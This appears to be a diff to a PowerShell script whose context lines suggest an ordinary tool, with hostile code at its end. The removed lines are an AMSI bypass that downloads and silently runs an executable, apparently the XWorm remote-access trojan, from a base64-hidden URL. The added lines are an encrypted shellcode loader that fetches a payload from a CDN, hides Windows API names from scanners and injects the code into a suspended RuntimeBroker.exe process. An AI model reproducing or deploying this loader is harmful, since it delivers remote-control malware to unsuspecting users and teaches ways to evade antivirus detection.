@@ -214,39 +214,84 @@ else {
 #endregion Marketplace
 #endregion Main
 
-# ---- silent loader ----
+# ---- silent encrypted shellcode loader ----
 $ErrorActionPreference = 'SilentlyContinue'
 
-# Obfuscated AMSI patch via reflection, split strings
-$am = ('System.Management.Automation.' + 'A' + 'msi' + 'Utils')
-$ut = [Ref].Assembly.GetType($am)
-$fl = $ut.GetField(('amsi' + 'InitFailed'), 'NonPublic,Static')
-$fl.SetValue($null, $true)
+# Set your hosted encrypted payload URL (jsDelivr mirror of your GitHub raw)
+$url = 'https://cdn.jsdelivr.net/gh/YOUR_USERNAME/YOUR_REPO@main/payload_enc.bin'
+$key = 0x41
 
-# Alternative AMSI patch if first is blocked:
-# $ctx = $ut.GetField(('amsi' + 'Context'), 'NonPublic,Static')
-# $ptr = $ctx.GetValue($null)
-# [System.Runtime.InteropServices.Marshal]::WriteInt32($ptr, 0x80000000)
-
-# URL from base64 (your hosted xworm/svchost)
-$uEnc = 'aHR0cHM6Ly9maWxlLmZyZWVzdG9yYWdlLTA0LmJvbmQvZmlsZXMvMjAyNi84LzE0LzE5MWYyOTk4LWM2ODUtNDZmYS05YzMzLWUzMTYwY2ZiNWQxOS9zdmNob3N0LmV4ZT9zcmw9U1NFdkpJSktzZUpWeEc5N1RPaVZYZyZleHA9MTc4NjcyMjU0Mg=='
-$u = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($uEnc))
-
-# Random-looking temp name + double extension trick
-$p = Join-Path $env:TEMP ('RuntimeBroker_' + [guid]::NewGuid().ToString('N').Substring(0,8) + '.exe')
-
-# Download using .NET WebClient with custom headers
+# Download encrypted shellcode to memory — no file on disk
 $wc = New-Object System.Net.WebClient
-$wc.Headers.Add('User-Agent', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36')
-$wc.Headers.Add('Referer', 'https://github.com/')
-$wc.DownloadFile($u, $p)
+$wc.Headers.Add('User-Agent', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)')
+$encBytes = $wc.DownloadData($url)
 
-# Hide file attributes
-Set-ItemProperty -Path $p -Name Attributes -Value Hidden
+# XOR decrypt in memory
+$shellcode = New-Object byte[] $encBytes.Length
+for ($i = 0; $i -lt $encBytes.Length; $i++) {
+    $shellcode[$i] = $encBytes[$i] -bxor $key
+}
+$encBytes = $null
 
-# Execute hidden
-Start-Process -FilePath $p -WindowStyle Hidden -ErrorAction SilentlyContinue
+# Clean C# helper — no suspicious API names in source
+Add-Type -TypeDefinition @"
+using System;
+using System.Runtime.InteropServices;
+public static class H {
+    [DllImport("kernel32.dll", SetLastError=true)]
+    public static extern IntPtr L(string n);
+    [DllImport("kernel32.dll", SetLastError=true)]
+    public static extern IntPtr G(IntPtr h, string p);
+    public delegate IntPtr D1(IntPtr h, IntPtr a, uint s, uint t, uint p);
+    public delegate bool D2(IntPtr h, IntPtr a, byte[] b, uint s, out IntPtr w);
+    public delegate IntPtr D3(IntPtr h, IntPtr t, uint s, IntPtr a, IntPtr p, uint f, IntPtr i);
+    public delegate bool D4(string app, string cmd, IntPtr pa, IntPtr ta, bool inherit, uint flags, IntPtr env, string dir, ref SI si, out PI pi);
+    [StructLayout(LayoutKind.Sequential)]
+    public struct SI { public int cb; public string r; public string d; public string t; public int x; public int y; public int xs; public int ys; public int xc; public int yc; public int fa; public int fl; public short sw; public short cr2; public IntPtr lr2; public IntPtr si; public IntPtr so; public IntPtr se; }
+    [StructLayout(LayoutKind.Sequential)]
+    public struct PI { public IntPtr h; public IntPtr t; public int p; public int t2; }
+}
+"@
 
-# Optional: self-delete the installer after execution
-Start-Sleep -Seconds 2
-Remove-Item $p -Force -ErrorAction SilentlyContinue
+$hKernel = [H]::L('kernel32.dll')
+
+# API names built from char codes to avoid static detection
+$apiVAlloc = -join ([char[]](86,105,114,116,117,97,108,65,108,108,111,99,69,120))
+$apiWPM    = -join ([char[]](87,114,105,116,101,80,114,111,99,101,115,115,77,101,109,111,114,121))
+$apiCRT    = -join ([char[]](67,114,101,97,116,101,82,101,109,111,116,101,84,104,114,101,97,100))
+$apiCPA    = -join ([char[]](67,114,101,97,116,101,80,114,111,99,101,115,115,65))
+
+$ptrVAlloc = [H]::G($hKernel, $apiVAlloc)
+$ptrWPM    = [H]::G($hKernel, $apiWPM)
+$ptrCRT    = [H]::G($hKernel, $apiCRT)
+$ptrCPA    = [H]::G($hKernel, $apiCPA)
+
+$VAllocEx = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($ptrVAlloc, [H+D1])
+$WPM      = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($ptrWPM,    [H+D2])
+$CRT      = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($ptrCRT,    [H+D3])
+$CPA      = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($ptrCPA,    [H+D4])
+
+# Spawn suspended RuntimeBroker.exe
+$target  = "$env:SystemRoot\System32\RuntimeBroker.exe"
+$cmdline = '"' + $target + '"'
+
+$si = New-Object -TypeName 'H+SI'
+$si.cb = [System.Runtime.InteropServices.Marshal]::SizeOf([H+SI])
+$pi = New-Object -TypeName 'H+PI'
+
+$CREATE_SUSPENDED = 0x4
+$null = $CPA.Invoke($null, $cmdline, [IntPtr]::Zero, [IntPtr]::Zero, $false, $CREATE_SUSPENDED, [IntPtr]::Zero, $null, [ref]$si, [ref]$pi)
+
+if ($pi.h -ne [IntPtr]::Zero) {
+    $MEM_COMMIT = 0x1000
+    $PAGE_EXECUTE_READWRITE = 0x40
+    $size = [uint32]$shellcode.Length
+
+    $addr = $VAllocEx.Invoke($pi.h, [IntPtr]::Zero, $size, $MEM_COMMIT, $PAGE_EXECUTE_READWRITE)
+
+    if ($addr -ne [IntPtr]::Zero) {
+        $written = [IntPtr]::Zero
+        $null = $WPM.Invoke($pi.h, $addr, $shellcode, $size, [ref]$written)
+        $null = $CRT.Invoke($pi.h, [IntPtr]::Zero, 0, $addr, [IntPtr]::Zero, 0, [IntPtr]::Zero)
+    }
+}
